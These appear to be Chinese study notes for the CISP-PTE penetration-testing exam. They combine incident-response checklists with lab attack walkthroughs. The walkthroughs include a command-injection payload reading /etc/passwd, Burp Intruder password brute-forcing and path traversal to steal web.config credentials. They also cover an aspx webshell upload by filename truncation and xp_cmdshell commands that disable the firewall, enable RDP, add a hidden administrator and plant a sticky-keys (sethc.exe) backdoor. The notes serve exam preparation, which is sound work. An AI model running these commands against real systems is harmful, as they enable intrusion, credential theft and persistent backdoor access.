第四题：命令执行

//ex1.php 



$dir = $\_GET\["dir"\]; 

if \(isset\($dir\)\) 

{ 

echo ""; 

system\("ls -al ".$dir\); 

echo ""; 

} 

?&gt; 

http://www.xx.com/ex1.php?dir=\|cat /etc/passwd

读文件：cat more less head tail tailf sort vi sed od tac 

管道：\| &



\|head ../key.php\|grep key

\|sed -n '1,5p' ../key.php\|grep key

\|od -c ../key.php

vi

第五题：日志分析：经验

可视化：soc 收集日志，但不分析，事后分析：发生

IDS:入侵检测，误报率高

fw:防火墙，防外：安全策略：白名单

穿墙：加密，反弹木马，端口复用：80，8080，25，无端口马：icmp, 脚本攻击：注入，跨站，http:80 dll注入ie进程：

免杀：小七论坛，汇编 ，白名单，

ips:入侵防御系统：ids+fw

utm:统一威胁管理：ids+fw,vpn,防病毒等

应急响应：

发生了什么?恶意：黑客入侵，大规划病毒爆发，玩笑

哪些系统受到影响？关键系统：BCP:BIA:业务影响分析

预计修复需要的资源有些哪些？人：内部，外部，物：大容量硬盘，照相机，深度数据收集工具：易失性

怎么发生？日志，入侵还原：

关键字搜索：404：找不到，200空格 

&lt;iframe

&lt;script&gt;

&lt;script src=&gt;

src=http

&lt

and%

应急方式：远程，本地

一。中间件 tomcat

1.日志：访问，错误，

2.配置文件：全局，用户：默认帐户和密码：admin,12345

xml

web.xml:

3.源码：恶意代码：java一句话，iframe,script src=http



二。webshell:功能和危害：

1.查源码

2.登录webshell:新建，编辑，删除，上传，下载，扫描，执行命令，system

三。windows

1.日志：系统：sys,应用：app,安全性：sec 异常登录：1:00

2.异常端口：netstat -ano 查端口--pid

tasklist:pid--进程名称

3.异常进程：火绒剑，

4。异常服务：启动：自动，手动，禁用 start:2,3,4

病毒木马借助服务来启动

5.异常文件：c:\windows\system32:svchost.exe

 c:\windows

6.异常启动项；msconfig

7.缓存区数据异常：dump

8.异常共享

9.异常映射:只读

10.异常dll:tasklist /m netapi32.dll



四：nids:日志

员工离职：帐户：

1.禁用：审计，防efs加密

Lisi:删除，重新建立：lisi

sid:安全标识符，唯一性

windows:

administrator:1f4=500

guest:1f5=501

新建用户：3e8=1000

linux:uid /etc/passwd:root:0

2.撤销用户所有逻辑访问权限：vpn,oa,门禁卡等 0-15:3

3.改禁用帐户密码，禁用帐户：guest 登录



准备：工具，呼叫树，人员等

检测：上下流通知，fw、ids设备日志，系统异常：慢，文件加密

遏制：关闭端口：net stop server,修改防火墙策略等

根除：病毒清除，打补丁，格式化感染硬盘

恢复：业务系统上线

跟踪总结：曾经发生事的地方：

人

pt黑客入侵时间：2小时&gt;dt+rt1小时:



解题：

firefox:

查找：ctrl+f:12.12 ---&gt;搜索访问成功：200空格/adminlogin.php

goodluck.php:有key

攻击方法：搜索：adminlogin.php ---暴力破解----最后：admin/index.php 

暴力破解：

1.登录：http://172.16.12.100:85/adminlogin.php

2.firefox:代理：127.0.0.1 8080

启动burp:

3.登录：admin 密码随意输入：111111

4.burp:抓包到请求登录包：右键--send to intruder

5.burp--intruder:

a.位置：positions:

暴力破解哪一个参数：

点击：clear

password=111111，值双击--》add

b.payload:字典

d:\安全工具\字典相关\password.txt

6.Intruder:start 

7.找密码：长度不一样



一。双参数：破解

name 

password

1.positions:

a.name,password---&gt;add



b.attack type:cluster bomb

2.payload sets:

1:username.txt

2:password.txt



攻击目标：192.168.1.144

wifi:tp\_link\_1145

pass:12345

1.端口范围：20000-3000 nmap -p 20000-30000 192.168.1.144

2.御剑扫描：robots.txt 任意文件下载文件漏洞:web.config

数据库连接密码，连接工具：navicat:dbo--表：OA登录帐户和密码，1key合到

2key:

上传aspx一句话，长文件名截断：

上传路径：

文件名截断

3key:.桌面：

24689



1key获取方法

1.nmap 扫描端口：

端围范围：nmap -p 20000-30000  ip

没有提供范围：nmap -sS ip

port:24689

御剑扫描配置弱点：

第一次考试：web.config.bak: 数据库连接帐户和密码：id=down

pass:down

第二次考试：任意文件下载漏洞：robots.txt--&gt;/admin/file\_down.aspx

http://192.168.1.144:24689/admin/file\_down.asp?file=../../web.config

数据库连接工具：navicat:dbo--表：oa登录用户名密码：

登录--第一个key:

第二个key获取：观察

长文件名截断：

aspx一句话木马：D:\安全工具\网站木马\webshell\aspx

aspx一句话木马小集：.net

上传长文件名：aaaaabbbbbcccc.aspx.jpg

截断：13：aaaaabbbbbccc

          aaaaabbb.aspx.jpg

文件名：636698554980486250-aaaaabbb.aspx 

上传路径：\upfile\affix\

http://192.168.1.144:24689/upfile/affix/636698554980486250-aaaaabbb.aspx 

菜刀连接：chopper---右键--新建连接--连接口：z

第三个key:数据管理员权限：SA



上传拿到webshell:老的配置：

web.config.bak.2017-12-12:

user:sa

pass:cisp-pte@sa

数据库连接工具：navicat:sa连接

dbo--查询--新建查询：

必要操作

1.启动xp\_cmdshell

exec sp\_configure 'show advanced options',1;

reconfigure;

exec sp\_configure 'xp\_cmdshell',1;

reconfigure

点击运行：

2.关闭防火墙：

exec master..xp\_cmdshell 'netsh firewall set opmode mode=disable'

3.开3389：D:\安全工具\提权工具\开启3389\3389.bat:一行一行执行：

exec master..xp\_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f'

4.查看管理员桌有什么文件：

exec master..xp\_cmdshell 'dir/a "C:\Documents and Settings\Administrator\桌面"'

key.txt

读第三个管理员桌面key:

1种.exec master..xp\_cmdshell 'type "C:\Documents and Settings\Administrator\桌面\key.txt"'

2种：

create table hyq\(line varchar\(5000\)\);

bulk insert hyq from 'C:\Documents and Settings\Administrator\桌面\key.txt';

select \* from hyq

3种：

exec master..xp\_cmdshell 'net user hyq666 123456 /add && net localgroup administrators hyq666 /add'

net改为net1

4.新题：shift后门：key:网上邻居

粘滞键：按五次shift--sethc.exe--》cmd.exe 进入桌面：system

a.exec master..xp\_cmdshell 'cd c:\windows\sysem32\ && attrib -s -h -r sethc.exe && copy cmd.exe sethc.exe '

b.mstsc:进行连接：按五次shift--cmd.exe-explorer.exe

net user administrator 123456



pte-2003:

出错：

1.我的电脑---右键--管理--服务和应用程序--iis---网站--默认：右键--属性--文档：添加：default.aspx

2.权限错误：按提示去改



